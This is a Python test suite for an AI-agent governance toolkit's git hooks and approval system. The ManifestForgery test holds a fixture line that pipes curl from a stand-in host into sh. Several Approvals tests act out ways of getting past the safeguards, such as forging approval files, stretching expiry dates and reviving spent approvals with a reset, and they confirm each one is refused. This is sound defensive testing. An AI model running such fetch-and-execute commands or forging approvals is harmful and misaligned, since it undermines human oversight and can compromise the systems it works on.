#!/usr/bin/env python3
"""The 6.0.0-m8 pass: `python maintainer/tests/test_m8.py`; test_migrate.py's load_tests runs it too, so core-verify
carries it."""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

import yaml

from synthetic import git, no_auto_gc
import test_scripts as m3

CORE = Path(__file__).resolve().parents[2]
WINDOWS = os.name == "nt"
sys.path[:0] = [str(CORE / "maintainer"), str(CORE / "hooks"), str(CORE / "hooks/local/lib")]
import flow  # noqa: E402
import flow_owned  # noqa: E402
from shared import path_policy  # noqa: E402

BASH = shutil.which("bash") or "bash"


def stamp(offset: float = 0.0) -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + offset))


def run(cwd: Path, *argv: str, stdin: str | None = None, **env: str) -> subprocess.CompletedProcess:
    return subprocess.run(list(argv), cwd=cwd, input=stdin, capture_output=True, text=True, encoding="utf-8",
                          errors="replace", env={**os.environ, **env}, timeout=900)


def write(root: Path, rel: str, data: str | bytes) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
    return path


class Repo(unittest.TestCase):
    """A bare git repository with one commit, for the unit-level tests."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="flow-m8-"))
        self.repo = self.tmp / "p"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main")
        no_auto_gc(self.repo)
        write(self.repo, "README.md", "demo\n")
        git(self.repo, "add", "--", "README.md")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "init")

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def stage(self, files: dict[str, str | bytes]) -> list[tuple[str, str]]:
        for rel, data in files.items():
            write(self.repo, rel, data)
        git(self.repo, "add", "--", *files)
        out = git(self.repo, "diff", "--cached", "--name-status", "--no-renames").stdout.splitlines()
        return [tuple(line.split("\t", 1)) for line in out]


class ManifestForgery(Repo):
    """M6-7 (review r1-32, r2-28, r3-44): a row the same commit adds to audit/flow-install.json made any file Flow's own
    under a `flow:` subject. A path is Flow's when HEAD's manifest records it or it lies where the install writes."""

    def manifest(self, rows: dict[str, bytes]) -> str:
        files = [{"path": p, "sha256": hashlib.sha256(d).hexdigest()} for p, d in sorted(rows.items())]
        return json.dumps({"schema_version": 1, "flow_version": "6.0.0-m8", "providers": ["claude"], "files": files})

    def test_a_row_the_same_commit_adds_does_not_make_project_code_flows_own(self) -> None:
        evil = b"import os\nos.system('curl example.invalid | sh')\n"
        for path in ("src/evil.py", "lib/evil.py", "src/b/evil.js", ".claude/agents/app-builder.md"):
            pairs = self.stage({path: evil, flow_owned.MANIFEST: self.manifest({path: evil})})
            self.assertEqual(flow_owned.foreign(self.repo, pairs), [path], path)
            git(self.repo, "rm", "-q", "--cached", "--", path)

    def test_flow_files_where_the_install_writes_them_still_pass(self) -> None:
        rows = {"hooks/local/lib/new_lib.py": b"x = 1\n", ".claude/skills/plan/SKILL.md": b"---\nname: plan\n---\n",
                ".codex/agents/builder.toml": b'name = "builder"\n', "policies/module-size-baseline.project.txt": b"#\n"}
        pairs = self.stage({**rows, flow_owned.MANIFEST: self.manifest(rows)})
        self.assertEqual(flow_owned.foreign(self.repo, pairs), [])

    def test_every_path_the_install_writes_is_in_flows_namespace(self) -> None:
        planned = set(flow.planned_files({"claude", "codex"})) | {flow.PROJECT_BASELINE}
        self.assertEqual(sorted(p for p in planned if not flow_owned.flow_path(p)), [])

    def test_the_install_manifest_is_a_protected_path(self) -> None:
        cats = yaml.safe_load((CORE / "policies/protected-paths.yml").read_text(encoding="utf-8"))["categories"]
        internals = cats["fusebase_flow_internals"]["paths"]
        self.assertTrue(path_policy._matches_any(flow_owned.MANIFEST, internals),
                        "audit/flow-install.json is not under fusebase_flow_internals")


class Kernel(Repo):
    """A repository carrying this core's hooks (shared, handlers, the mint scripts) and policies at HEAD."""

    def setUp(self) -> None:
        super().setUp()
        for rel in ("hooks/shared", "hooks/handlers", "policies"):
            shutil.copytree(CORE / rel, self.repo / rel, ignore=shutil.ignore_patterns("__pycache__"))
        for rel in ("hooks/local/write-bootstrap-approval.sh", "hooks/local/approve-local.sh", "FLOW_RULES.md"):
            write(self.repo, rel, (CORE / rel).read_bytes())
        write(self.repo, "fusebase.json", "{}\n")
        write(self.repo, "state/approvals/.gitkeep", "")
        git(self.repo, "add", "--", ".")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "the kernel")

    def py(self, code: str) -> str:
        out = run(self.repo, sys.executable, "-c", "import sys; sys.path.insert(0, 'hooks')\n" + code)
        self.assertEqual(out.returncode, 0, out.stderr)
        return out.stdout.strip()

    def path_decision(self, rel: str) -> str:
        return self.py(f"from pathlib import Path\nfrom shared.path_policy import evaluate\n"
                       f"print(evaluate({rel!r}, root=Path.cwd()).decision)")

    def mint(self, *args: str, ttl: str = "30") -> subprocess.CompletedProcess:
        return run(self.repo, BASH, "hooks/local/write-bootstrap-approval.sh", *args, FF_BOOTSTRAP_TTL_MIN=ttl,
                   MSYS="noglob")

    def tool(self, name: str, rel: str) -> str:
        event = {"cwd": str(self.repo), "tool_name": name, "tool_input": {"file_path": rel, "content": "{}\n"}}
        out = run(self.repo, sys.executable, "hooks/handlers/pre_tool_use.py", stdin=json.dumps(event))
        return json.loads(out.stdout or "{}").get("flow_decision", f"rc={out.returncode} {out.stderr[-300:]}")


class Approvals(Kernel):
    """M6-6 (review r2-26, r2-26b, O-31 (k)): a hand-written approval with no TTL cap and no single use was accepted and
    reused. Every category is digest-bound and single use, every approval capped by its action's TTL, and an agent's
    Edit or Write into state/approvals/ or .git/flow/ denied."""

    def test_a_hand_written_path_and_ttl_approval_for_fusebase_json_is_refused(self) -> None:
        write(self.repo, "fusebase.json", '{"app": "x"}\n')
        git(self.repo, "add", "--", "fusebase.json")
        made = {"schema_version": 2, "action": "protected_path_edit", "scope": "x", "approved_by": "nobody",
                "created_at": stamp(), "expires_at": "2036-01-01T00:00:00Z", "reason": "x", "paths": ["fusebase.json"]}
        write(self.repo, "state/approvals/protected_path_edit-x-20261021.json", json.dumps(made))
        self.assertEqual(self.path_decision("fusebase.json"), "deny")

    def test_the_mint_approves_any_category_once(self) -> None:
        write(self.repo, "fusebase.json", '{"app": "x"}\n')
        git(self.repo, "add", "--", "fusebase.json")
        out = self.mint("--category", "deployment_config")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        self.assertEqual(self.path_decision("fusebase.json"), "allow")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T1: the approved change lands")
        git(self.repo, "reset", "-q", "--soft", "HEAD~1")  # HEAD back where it was minted, the same bytes staged again
        self.assertEqual(self.path_decision("fusebase.json"), "deny", "a spent approval revived by a reset")

    def test_an_approval_living_past_its_cap_is_refused(self) -> None:
        write(self.repo, "FLOW_RULES.md", "# rules, edited\n")
        git(self.repo, "add", "--", "FLOW_RULES.md")
        self.assertEqual(self.mint(ttl="90").returncode, 2, "a 90-minute mint")
        self.assertEqual(self.mint().returncode, 0)
        self.assertEqual(self.path_decision("FLOW_RULES.md"), "allow")
        artifact = next((self.repo / "state/approvals").glob("protected_path_edit-flow-bootstrap-*.json"))
        data = json.loads(artifact.read_text(encoding="utf-8"))
        for created, expires in ((data["created_at"], stamp(2 * 86400)), (stamp(86400), stamp(86400 + 600))):
            artifact.write_text(json.dumps(data | {"created_at": created, "expires_at": expires}), encoding="utf-8")
            self.assertEqual(self.path_decision("FLOW_RULES.md"), "deny", (created, expires))

    def test_a_command_approval_living_past_its_actions_ttl_is_refused(self) -> None:
        out = run(self.repo, BASH, "hooks/local/approve-local.sh", "database_migration", "m1", "go",
                  "--command", "npx prisma migrate deploy")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        decide = ("from pathlib import Path\nfrom shared.command_policy import evaluate\n"
                  "print(evaluate('npx prisma migrate deploy', root=Path.cwd()).decision)")
        self.assertEqual(self.py(decide), "allow")
        artifact = next((self.repo / "state/approvals").glob("database_migration-m1-*.json"))
        data = json.loads(artifact.read_text(encoding="utf-8"))
        artifact.write_text(json.dumps(data | {"expires_at": "2036-01-01T00:00:00Z"}), encoding="utf-8")
        self.assertEqual(self.py(decide), "deny", "a 120-minute action approved until 2036")

    def test_the_write_tool_cannot_write_an_approval_or_the_approval_record(self) -> None:
        for rel in ("state/approvals/protected_path_edit-x-20991231.json", ".git/flow/approved-changes.tsv",
                    "STATE/Approvals/x.json"):
            self.assertEqual(self.tool("Write", rel), "deny", rel)
        self.assertEqual(self.tool("Write", "state/notes.md"), "allow")

    def test_approve_local_sends_a_protected_path_edit_to_the_single_use_mint(self) -> None:
        out = run(self.repo, BASH, "hooks/local/approve-local.sh", "protected_path_edit", "x", "--path", "fusebase.json")
        self.assertEqual(out.returncode, 2, out.stdout + out.stderr)
        self.assertIn("write-bootstrap-approval.sh --category deployment_config", out.stderr)
        self.assertEqual(list((self.repo / "state/approvals").glob("protected_path_edit-*.json")), [])

    def test_health_lists_an_expired_approval(self) -> None:
        import health
        write(self.repo, "state/approvals/database_migration-old-20261001.json",
              json.dumps({"action": "database_migration", "expires_at": "2026-10-01T00:00:00Z"}))
        write(self.repo, "state/approvals/database_migration-new-20991231.json",
              json.dumps({"action": "database_migration", "expires_at": stamp(600)}))
        self.assertEqual(health.approvals(self.repo), ["approval: database_migration-old-20261001.json expired "
                                                       "(2026-10-01T00:00:00Z); it authorizes nothing: delete it"])


class MergeHead(Repo):
    """M6-8 (review r2-29): a MERGE_HEAD file let any subject through. A merge is one whose MERGE_HEAD names commits HEAD
    does not contain, and what it adds beyond its parents takes the subject rules."""

    def subject(self, text: str) -> subprocess.CompletedProcess:
        msg = self.tmp / "msg.txt"
        msg.write_text(text + "\n", encoding="utf-8")
        return run(self.repo, sys.executable, str(CORE / "hooks/local/lib/commit_msg.py"), str(msg))

    def side(self) -> str:
        git(self.repo, "checkout", "-q", "-b", "side")
        write(self.repo, "side.txt", "side\n")
        git(self.repo, "add", "--", "side.txt")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T1: side")
        git(self.repo, "checkout", "-q", "main")
        write(self.repo, "main.txt", "main\n")
        git(self.repo, "add", "--", "main.txt")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T2: main")
        return "side"

    def test_a_hand_made_merge_head_naming_head_lets_no_subject_through(self) -> None:
        write(self.repo, "src/z.py", "x = 1\n")
        git(self.repo, "add", "--", "src/z.py")
        head = git(self.repo, "rev-parse", "HEAD").stdout.strip()
        write(self.repo, ".git/MERGE_HEAD", head + "\n")
        out = self.subject("whatever")
        self.assertEqual(out.returncode, 1, out.stderr)
        self.assertIn("must cite a T-number", out.stderr)

    def test_code_staged_into_a_real_merge_needs_its_task_and_a_clean_merge_passes(self) -> None:
        git(self.repo, "merge", "--no-commit", "--no-ff", self.side())
        self.assertEqual(self.subject("Merge branch 'side'").returncode, 0, "a clean merge")
        write(self.repo, "src/z.py", "x = 1\n")
        git(self.repo, "add", "--", "src/z.py")
        out = self.subject("Merge branch 'side'")
        self.assertEqual(out.returncode, 1, out.stderr)
        self.assertIn("this merge changes src/z.py beyond what its parents hold", out.stderr)
        self.assertEqual(self.subject("Merge branch 'side' (T3: add z)").returncode, 0)

    def test_a_file_both_sides_changed_in_other_hunks_merges_clean(self) -> None:
        write(self.repo, "f.txt", "".join(f"line {n}\n" for n in range(12)))
        git(self.repo, "add", "--", "f.txt")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T1: f")
        git(self.repo, "checkout", "-q", "-b", "side")
        write(self.repo, "f.txt", "".join(f"line {n}{' side' if n == 1 else ''}\n" for n in range(12)))
        git(self.repo, "commit", "-q", "--no-verify", "-am", "T2: side")
        git(self.repo, "checkout", "-q", "main")
        write(self.repo, "f.txt", "".join(f"line {n}{' main' if n == 10 else ''}\n" for n in range(12)))
        git(self.repo, "commit", "-q", "--no-verify", "-am", "T3: main")
        git(self.repo, "merge", "--no-commit", "--no-ff", "side")
        self.assertEqual(self.subject("Merge branch 'side'").returncode, 0)



class UnicodePaths(unittest.TestCase):
    """M6-9 (review r2-10) and field item 7.6: git's UTF-8 output was read in the Windows code page, so install refused a
    project folder with a non-ASCII letter (a Cyrillic one crashed the print), and slice.py printed `§` as U+FFFD."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="flow-m8-"))

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_install_goes_into_a_cafe_and_a_cyrillic_folder(self) -> None:
        for name in ("café", "проект"):
            repo = self.tmp / name
            repo.mkdir()
            git(repo, "init", "-q", "-b", "main")
            no_auto_gc(repo)
            out = subprocess.run([sys.executable, str(CORE / "maintainer/flow.py"), "install", "--target", str(repo),
                                  "--providers", "claude"], capture_output=True, timeout=900)
            text = out.stdout.decode("utf-8", "replace") + out.stderr.decode("utf-8", "replace")
            self.assertEqual(out.returncode, 0, text)
            self.assertIn(f"-> {repo.resolve()}", text)
            self.assertTrue((repo / "hooks/local/lib/commit_msg.py").is_file())

    def test_slice_prints_the_section_sign_as_utf8(self) -> None:
        import test_scripts as m3
        repo = self.tmp / "p"
        repo.mkdir()
        git(repo, "init", "-q", "-b", "main")
        no_auto_gc(repo)
        base = m3.commit(repo, {"docs/flow/backlog.md": "# Backlog\n\n## B1 Terms\n- source: owner\n"
                                "- criterion: § 4.2 of the terms holds.\n- risk: none\n- status: open\n"}, "init")
        write(repo, "docs/flow/phases.md", m3.phases_doc(base, [("T1", "src/**")]))
        out = subprocess.run([sys.executable, str(CORE / "hooks/local/slice.py"), "T1", "--root", str(repo)],
                             capture_output=True, timeout=300)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn("§ 4.2 of the terms holds.", out.stdout.decode("utf-8"))



class SymlinkedOverlays(unittest.TestCase):
    """M6-14 (review r2-03): a CLAUDE.md that links to AGENTS.md was replaced by a regular file."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="flow-m8-"))
        self.repo = self.tmp / "p"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main")
        no_auto_gc(self.repo)
        write(self.repo, "AGENTS.md", "# Project agents\n")
        try:
            os.symlink("AGENTS.md", self.repo / "CLAUDE.md")
        except (OSError, NotImplementedError) as exc:
            shutil.rmtree(self.tmp, ignore_errors=True)
            self.skipTest(f"no symlink here ({exc})")

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_install_refuses_a_symlinked_claude_md_and_prints_the_block(self) -> None:
        out = run(self.tmp, sys.executable, str(CORE / "maintainer/flow.py"), "install", "--target", str(self.repo),
                  "--providers", "claude")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        self.assertTrue((self.repo / "CLAUDE.md").is_symlink(), "the link was replaced")
        self.assertIn("CLAUDE.md (a symlink or not a regular file: the Flow block is not written", out.stdout)
        self.assertIn("## FuseBase Flow — Claude Code adapter", out.stdout)
        self.assertIn("<!-- FLOW:BEGIN", (self.repo / "AGENTS.md").read_text(encoding="utf-8"))

    def test_the_migration_stops_on_a_symlinked_overlay(self) -> None:
        sys.path.insert(0, str(CORE / "maintainer"))
        import migrate
        import migrate_preflight
        check = migrate_preflight.overlays(migrate.Inventory(target=self.repo, providers={"claude"}, version="5.6"))
        self.assertTrue(check.stop, check)
        self.assertIn("CLAUDE.md is a symlink", check.found)



class StagedEvidence(m3.Validator):
    """r3-83: the pre-commit's evidence stage read docs/flow/evidence/<phase>.md from the working tree while the commit
    took the staged blob, so a staged row with an all-zero sha256 committed past it."""

    def staged(self) -> subprocess.CompletedProcess:
        return m3.run(str(CORE / "hooks/local/validate_evidence.py"), "--staged", "--root", str(self.repo), cwd=self.tmp)

    def test_a_staged_row_the_working_copy_hides_is_refused(self) -> None:
        good = self.rows["B1"]
        self.rows["B1"] = good.replace(good.split(" | ")[3], "0" * 64)
        self.validate()  # writes the evidence file with the zero sha256 row
        git(self.repo, "add", "--", "docs/flow/evidence/P1.md")
        self.rows["B1"] = good
        self.validate()  # the working copy now holds the true row; the staged one still the zero row
        out = self.staged()
        self.assertEqual(out.returncode, 1, out.stdout)
        self.assertIn("docs/flow/evidence/P1.md: its working copy differs from the staged one", out.stdout)
        git(self.repo, "add", "--", "docs/flow/evidence/P1.md")
        self.assertEqual(self.staged().returncode, 0, "staged and working copies agree")

    def test_a_staged_run_log_the_working_copy_changed_is_refused(self) -> None:
        self.validate()
        git(self.repo, "add", "--", "docs/flow/evidence/P1.md", "runs/run-1/README.md")
        write(self.repo, "runs/run-1/README.md", m3.RUN_LOG.format(records="| 2026-10-18T10:00:00.000Z | S1 | PASS |\n"
                                                                          "| 2026-10-18T10:05:00.000Z | S1 | PASS |\n"))
        out = self.staged()
        self.assertEqual(out.returncode, 1, out.stdout)
        self.assertIn("runs/run-1/README.md: the working copy differs from the staged one", out.stdout)



class FindingMarker(m3.Validator):
    """r1-28 (and r2-32's marker part): `FINDING:`, `finding`, `Finding`, `FINDINGS` and `**FINDING**` records, and a
    FINDING row after a blank line, left a PASS standing; a test-id row passed when its name was any substring of the test
    file (field item 7.7: a short title such as S2 matched wherever the token stood)."""

    locals().update(dict.fromkeys(n for n in dir(m3.Validator) if n.startswith("test")))  # the inherited tests run there

    def test_every_spelling_of_the_marker_fails_the_pass(self) -> None:
        for record in ("FINDING: the button is dead", "finding the button is dead", "Finding: dead", "FINDINGS 2",
                       "**FINDING** dead"):
            write(self.repo, "runs/run-1/README.md", m3.RUN_LOG.format(
                records=f"| 2026-10-18T10:00:00.000Z | S1 | PASS |\n| 2026-10-18T10:01:00.000Z | S2 | {record} |\n"))
            self.assert_fails("B1", "FINDING")

    def test_a_finding_after_a_blank_line_is_read_and_no_findings_is_no_finding(self) -> None:
        write(self.repo, "runs/run-1/README.md", m3.RUN_LOG.format(
            records="| 2026-10-18T10:00:00.000Z | S1 | PASS |\n\n| 2026-10-18T10:01:00.000Z | S2 | FINDING F7 |\n"))
        self.assert_fails("B1", "FINDING")
        write(self.repo, "runs/run-1/README.md", m3.RUN_LOG.format(
            records="| 2026-10-18T10:00:00.000Z | S1 | PASS: no findings |\n\n## Notes\n\n| x | S2 | FINDING later |\n"))
        self.assertEqual(self.validate().returncode, 0)

    def test_a_test_id_row_names_a_whole_test_title(self) -> None:
        m3.commit(self.repo, {"test/auth.test.ts": "test('magic link expires', () => {});\n// S2 covers the C4 clause\n"},
                  "T2: the test, with a comment")
        for name in ("magic", "S2", "C4 clause"):
            self.rows["B2"] = f"| B2 | PASS | test/auth.test.ts::{name} | - | - | runs/unit.tap | - |"
            write(self.repo, "runs/unit.tap", f"TAP version 13\nok 1 - {name}\n")
            self.assert_fails("B2", "the test is absent at HEAD")
        self.rows["B2"] = "| B2 | PASS | test/auth.test.ts::magic link expires | - | - | runs/unit.tap | - |"
        write(self.repo, "runs/unit.tap", "TAP version 13\nok 1 - magic link expires\n")
        self.assertEqual(self.validate().returncode, 0)



class ReleaseRecheck(unittest.TestCase):
    """M6-11 (review r1-60, r2-101; O-8): core-release.yml re-checks, after publishing, that the release's tag still
    names the commit core-verify verified. maintainer/release_check.py against a fake GitHub API."""

    VERIFIED, OTHER, TAG_OBJECT = "a" * 40, "b" * 40, "c" * 40

    def serve(self, routes: dict[str, dict]) -> str:
        import http.server
        import threading

        class Fake(http.server.BaseHTTPRequestHandler):
            def do_GET(self) -> None:  # noqa: N802 (http.server's name)
                body = routes.get(self.path)
                self.send_response(200 if body is not None else 404)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(body if body is not None else {"message": "Not Found"}).encode("utf-8"))

            def log_message(self, *args: object) -> None:
                pass
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Fake)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.shutdown)
        return f"http://127.0.0.1:{server.server_address[1]}"

    def check(self, api: str, tag: str = "6.0.0-m8") -> subprocess.CompletedProcess:
        return run(CORE, sys.executable, str(CORE / "maintainer/release_check.py"), "--tag", tag, "--sha", self.VERIFIED,
                   "--repo", "o/r", "--api", api, GH_TOKEN="")

    def routes(self, ref: dict, tag_object: dict | None = None, release: bool = True) -> dict:
        found = {"/repos/o/r/git/ref/tags/6.0.0-m8": {"object": ref}}
        if tag_object is not None:
            found[f"/repos/o/r/git/tags/{self.TAG_OBJECT}"] = {"object": tag_object}
        if release:
            found["/repos/o/r/releases/tags/6.0.0-m8"] = {"tag_name": "6.0.0-m8", "prerelease": True}
        return found

    def test_the_tag_on_the_verified_commit_passes(self) -> None:
        for routes in (self.routes({"type": "commit", "sha": self.VERIFIED}),
                       self.routes({"type": "tag", "sha": self.TAG_OBJECT}, {"type": "commit", "sha": self.VERIFIED})):
            out = self.check(self.serve(routes))
            self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
            self.assertIn(f"names the verified commit {self.VERIFIED}", out.stdout)

    def test_a_tag_moved_to_another_commit_fails_loudly(self) -> None:
        for routes in (self.routes({"type": "commit", "sha": self.OTHER}),
                       self.routes({"type": "tag", "sha": self.TAG_OBJECT}, {"type": "commit", "sha": self.OTHER})):
            out = self.check(self.serve(routes))
            self.assertEqual(out.returncode, 1, out.stdout)
            self.assertIn(f"::error::the published release 6.0.0-m8 now names commit {self.OTHER}, not "
                          f"{self.VERIFIED}, the commit core-verify verified", out.stdout)

    def test_no_release_for_the_tag_fails(self) -> None:
        out = self.check(self.serve(self.routes({"type": "commit", "sha": self.VERIFIED}, release=False)))
        self.assertEqual(out.returncode, 1, out.stdout)
        self.assertIn("::error::the API could not confirm the release 6.0.0-m8", out.stdout)



class ShippedTexts(unittest.TestCase):
    """Item 6 (the review's docs-vs-behaviour rows r1-55, r1-56, r2-90, r2-93, r3-74): the texts a project receives say
    what the tree does: no stale version, the shell the commit route needs and its PowerShell form, python3 and the
    Linux PyYAML route, the by-name staging."""

    def test_readme_and_the_lifecycle_page_name_no_pre_release_and_the_shell_the_commit_route_needs(self) -> None:
        readme = (CORE / "README.md").read_text(encoding="utf-8")
        lifecycle = (CORE / "workflows/lifecycle.md").read_text(encoding="utf-8")
        for text, name in ((readme, "README.md"), (lifecycle, "workflows/lifecycle.md")):
            self.assertNotRegex(text, r"6\.0\.0-m\d", f"{name} names a pre-release, which goes stale")
            self.assertIn("in Git Bash", text, name)
        for phrase in ('$env:FF_BOOTSTRAP_TTL_MIN=30; & "$env:ProgramFiles\\Git\\bin\\bash.exe"',
                       "python3 maintainer/flow.py install", "sudo apt install python3-yaml", "git add -u",
                       "maintainer/release-notes/<version>.md"):
            self.assertIn(phrase, readme)
        self.assertIn("stage them by name (`git add -u`, then the added files)", lifecycle)



class ProtectedStageCost(Kernel):
    """Item 10 (O-31 (j)): the protected-path check ran `git ls-files` once per approved path, per staged path, per
    artifact: O(n^2) git calls, 830 s for a fresh install's commit on a loaded host. It reads the index once."""

    def test_judging_forty_staged_protected_paths_costs_a_bounded_number_of_git_calls(self) -> None:
        paths = [f"hooks/shared/probe_{n:02d}.py" for n in range(40)]
        for rel in paths:
            write(self.repo, rel, f"X = {len(rel)}\n")
        git(self.repo, "add", "--", *paths)
        self.assertEqual(self.mint().returncode, 0)
        code = ("import subprocess, sys\nfrom pathlib import Path\nfrom shared.path_policy import evaluate\n"
                "real, calls = subprocess.run, []\n"
                "def count(*a, **k):\n    calls.append(a[0][:3] if a else k.get('args'))\n    return real(*a, **k)\n"
                "subprocess.run = count\n"
                f"decisions = {{evaluate(p, root=Path.cwd()).decision for p in {paths!r}}}\n"
                "print(sorted(decisions), len(calls))")
        decisions, calls = self.py(code).rsplit(" ", 1)
        self.assertEqual(decisions, "['allow']")
        self.assertLess(int(calls), 4 * len(paths), f"{calls} git calls for {len(paths)} staged paths")



class PrintedSteps(Kernel):
    """Item 6 (review r1-57, r1-64, r2-91, r3-75, r3-84, r1-41, r3-60, r1-54; M6-28): a step the kernel prints names
    only what the tree ships: no hooks/tests/run-tests.sh or bootstrap-upgrade.sh on a 6.0 tree, `FAIL: <why>` for a row,
    a `T<n>:` subject for the baseline adoption, and a mint with no DeprecationWarning and an ASCII line."""

    def test_install_names_health_not_a_test_runner_the_core_does_not_ship(self) -> None:
        repo = self.tmp / "fresh"
        repo.mkdir()
        git(repo, "init", "-q", "-b", "main")
        no_auto_gc(repo)
        out = run(self.tmp, sys.executable, str(CORE / "maintainer/flow.py"), "install", "--target", str(repo),
                  "--providers", "claude")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        self.assertNotIn("run-tests.sh", out.stdout)
        self.assertIn("Check with: python <the Flow core>/maintainer/flow.py health --target <this project>", out.stdout)

    def test_the_mint_prints_no_deprecation_warning_and_an_ascii_line(self) -> None:
        write(self.repo, "FLOW_RULES.md", "# rules, edited\n")
        git(self.repo, "add", "--", "FLOW_RULES.md")
        out = self.mint()
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertNotIn("DeprecationWarning", out.stderr)
        self.assertTrue(out.stdout.isascii(), out.stdout)

    def test_the_hooks_name_6_0_routes(self) -> None:
        pre = (CORE / "hooks/git/pre-commit").read_text(encoding="utf-8")
        self.assertIn('if [ -f "$ROOT/hooks/local/bootstrap-upgrade.sh" ]; then', pre)
        self.assertIn("else re-run the Flow install (python <the Flow core>/maintainer/flow.py install --target .)", pre)
        self.assertIn("or record the row as \\`FAIL: <why>\\`", pre)
        size = (CORE / "hooks/local/check-module-size.sh").read_text(encoding="utf-8")
        self.assertIn('[ -f "$ROOT/hooks/local/lib/commit_msg.py" ] && subject="T<n>: adopt the module-size baseline', size)


class TaskIdInsideAnItemId(m3.Validator):
    """Field item 7.1: the task-id match took T276 inside an item id such as O-T276-2: a commit subject naming
    `O-T276-2` counted as task T276's, and commit-msg saw two task ids."""

    locals().update(dict.fromkeys(n for n in dir(m3.Validator) if n.startswith("test")))  # the inherited tests run there

    def test_an_item_id_is_no_task_id(self) -> None:
        import flow_docs as fd
        self.assertEqual(fd.TASK.findall("T5: close O-T276-2 and D-T265-3 (T278a stays)"), ["T5"])
        self.assertEqual(fd.TASK.findall("fix(x): T12 the banner"), ["T12"])
        msg = self.tmp / "msg.txt"
        msg.write_text("T2: the test, closing O-T1-2\n", encoding="utf-8")
        out = m3.run(str(CORE / "hooks/local/lib/commit_msg.py"), str(msg), cwd=self.repo)
        self.assertNotIn("exactly one T<n> per commit", out.stderr)


class IndentedTap(m3.Validator):
    """Field item 7.2: the evidence check read TAP's `ok N -` only at the start of a line, so Node's indented subtests
    were invisible."""

    locals().update(dict.fromkeys(n for n in dir(m3.Validator) if n.startswith("test")))  # the inherited tests run there

    def test_an_indented_subtest_line_holds_a_test_id_row(self) -> None:
        m3.write(self.repo, "runs/unit.tap", "TAP version 13\n# Subtest: auth\n    ok 1 - magic link expires\n    1..1\n"
                                             "ok 1 - auth\n")
        out = self.validate()
        self.assertEqual(out.returncode, 0, out.stdout)
        self.assertIn("  B2 PASS", out.stdout)


class DeployOrderWarning(m3.Validator):
    """Field item 7.3: the deploy-order check skipped silently when state/deploys/<env>.jsonl or the `(env)` of the run
    log's title was missing."""

    locals().update(dict.fromkeys(n for n in dir(m3.Validator) if n.startswith("test")))  # the inherited tests run there

    def test_a_check_that_cannot_run_says_so(self) -> None:
        (self.repo / "state/deploys/dev.jsonl").unlink()
        out = self.validate()
        self.assertIn("WARNING deploy order not checked: state/deploys/dev.jsonl holds no finished deploy", out.stdout)
        m3.write(self.repo, "runs/run-1/README.md", m3.RUN_LOG.replace(" (dev)", "").format(
            records="| 2026-10-18T10:00:00.000Z | S1 | PASS |\n"))
        out = self.validate()
        self.assertIn("WARNING deploy order not checked: the run log's title names no environment", out.stdout)
        self.assertEqual(out.returncode, 0, out.stdout)


class PlanCommitsAreNoTasks(m3.Validator):
    """Field item 7.4: slice_log counted a `plan:` commit that named a task as that task's commit, so a 2.5-minute task
    showed 273 minutes."""

    locals().update(dict.fromkeys(n for n in dir(m3.Validator) if n.startswith("test")))  # the inherited tests run there

    def test_a_plan_ship_or_flow_commit_naming_a_task_is_not_its_commit(self) -> None:
        import flow_docs as fd
        for subject in ("plan: T1 widened to src/b/**", "ship: T1 to dev", "flow: upgrade, T1 untouched"):
            m3.commit(self.repo, {"docs/flow/backlog.md": m3.BACKLOG.format(risk="none") + f"<!-- {subject} -->\n"},
                      subject)
        log = fd.slice_log(self.repo, fd.phases(self.repo)["P1-S1"])
        self.assertEqual(sorted(s for _, s, _, _ in log), ["T1: the expiry", "T2: the test"])


class ItemEditRow(m3.Validator):
    """Field item 7.5: the item-edit flag had no row in state/flags/<slice>.tsv, so it could not be ruled."""

    locals().update(dict.fromkeys(n for n in dir(m3.Validator) if n.startswith("test")))  # the inherited tests run there

    def test_the_item_edit_flag_gets_a_row_the_planner_can_rule(self) -> None:
        m3.write(self.repo, "docs/flow/backlog.md", m3.BACKLOG.format(risk="auth"))
        out = m3.run(str(m3.LOCAL / "checks.py"), "P1-S1", "--root", str(self.repo), cwd=self.tmp)
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        rows = (self.repo / "state/flags/P1-S1.tsv").read_text(encoding="utf-8").splitlines()
        edit = [r.split("\t") for r in rows if r.startswith("item-edit-")]
        self.assertEqual([(r[1], r[2], r[3]) for r in edit], [("5", "T1", "B1: risk changed since the phase's base")])

if __name__ == "__main__":
    unittest.main()
